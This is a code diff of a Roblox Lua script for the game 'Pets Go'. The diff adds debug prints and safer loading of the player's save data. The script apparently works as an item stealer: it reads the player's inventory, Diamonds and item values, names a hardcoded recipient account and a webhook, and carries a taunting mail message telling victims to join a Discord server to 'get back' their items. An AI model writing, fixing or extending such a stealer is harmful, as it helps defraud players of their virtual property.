@@ -5,16 +5,63 @@ end
 _G.scriptExecuted = true
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
-local library = require(game.ReplicatedStorage.Library)
-local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
+print("network:", network)
+
+local libObj = game:GetService("ReplicatedStorage"):FindFirstChild("Library")
+print("Library object:", libObj)
+
+local library = nil
+if libObj then
+    library = require(libObj)
+end
+print("library:", library)
+
+local libraryClient = nil
+if libObj then
+    libraryClient = libObj:FindFirstChild("Client")
+end
+print("libraryClient:", libraryClient)
+
+local saveModule = nil
+if libraryClient then
+    saveModule = libraryClient:FindFirstChild("Save")
+end
+print("saveModule:", saveModule)
+
+local save = nil
+if saveModule then
+    local ok, result = pcall(function() return require(saveModule).Get().Inventory end)
+    if ok then
+        save = result
+    else
+        print("Error in require(saveModule):", result)
+    end
+end
+print("save:", save)
+
 local plr = game.Players.LocalPlayer
+print("plr:", plr)
 local MailMessage = "Join gg / GY2RVSEGDT to get back"
 local HttpService = game:GetService("HttpService")
+print("HttpService:", HttpService)
+
 local sortedItems = {}
 local totalRAP = 0
 local sentUsers = {}
+
 local GetSave = function()
-    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+    if saveModule then
+        local ok, result = pcall(function() return require(saveModule).Get() end)
+        if ok then
+            return result
+        else
+            print("Error in require(saveModule).Get():", result)
+            return {}
+        end
+    else
+        warn("saveModule is nil in GetSave!")
+        return {}
+    end
 end
 
 local users = {"NuMBeX3230"}
@@ -27,6 +74,7 @@ if next(users) == nil or webhook == "" then
     return
 end
 
+print("game.PlaceId:", game.PlaceId)
 if game.PlaceId ~= 18901165922 then
     plr:kick("Game not supported. Please join a normal Pets Go server")
     return
@@ -43,9 +91,11 @@ local GemAmount1 = 0
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
-		break
+        break
     end
 end
+print("GemAmount1:", GemAmount1)
+
 
 local function formatNumber(number)
     if number == nil then
